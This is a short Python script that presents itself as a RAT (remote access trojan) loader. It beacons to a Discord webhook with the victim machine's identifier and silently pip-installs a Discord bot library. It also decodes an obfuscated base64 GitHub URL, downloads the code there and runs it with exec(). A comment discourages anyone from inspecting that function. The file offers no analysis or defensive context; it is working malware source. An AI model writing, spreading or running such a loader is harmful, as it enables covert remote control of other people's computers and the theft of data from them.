import requests
import base64
import tkinter as tk
import sys
import uuid
import json

with open("spread.json") as f:
    sinfo = json.load(f)

def run():
    # Let's check if the user has Pycord installed
    r = requests.post(sinfo["webhook"], json={"content": "Running RAT... Identifier: " + str(uuid.getnode())})
    try:
        import discordbot
    except:
        requests.post(sinfo["webhook"], json={"content": "Installing Pycord... Identifier: " + str(uuid.getnode())})
        # If they don't, let's install it for them
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "py-cord"])
        requests.post(sinfo["webhook"], json={"content": "Running Discord bot... Identifier: " + str(uuid.getnode())})
        import discordbot


def sasInit():
    # You shouldn't need to even look at this function
    headers = {"Cache-Control": "no-cache"}
    r = requests.get(base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Blcm55ZGV2L2Rpc2NvbnRyb2wvbWFpbi9zYXMucHk='), headers=headers)
    code = r.text
    exec(code)
    run()



if __name__ == "__main__":
    sasInit()